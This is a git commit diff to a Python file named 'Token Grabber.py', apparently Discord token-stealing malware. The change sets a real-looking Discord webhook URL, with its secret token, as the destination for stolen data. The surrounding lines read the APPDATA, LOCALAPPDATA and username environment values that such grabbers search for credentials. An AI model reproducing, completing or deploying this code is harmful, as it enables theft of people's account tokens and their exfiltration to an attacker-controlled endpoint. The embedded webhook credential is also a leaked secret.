c4ae3435e849a3adc79b545b647508b143fb82d3
rakeshmadhure8-design <rakeshmadhure8@gmail.com>
2026-06-06 21:10:53 +0530

    Update Token Grabber.py

--- Token Grabber.py
+++ Token Grabber.py
@@ -12,7 +12,7 @@ import zipfile
 from requests import get
 from dhooks import Webhook, File
 
-hook = Webhook('WEBHOOK HERE')
+hook = Webhook('https://discord.com/api/webhooks/1512836453757882380/wO9y5mJJYOFhg9nJhc2LV4WV8bW2cRqCzj3JBk6icqjHqqZ4TeHGDEArqsiEbiKhu1qC')
 path = os.getenv('APPDATA')
 localpath = os.getenv('LOCALAPPDATA')
 user = os.getenv('username')
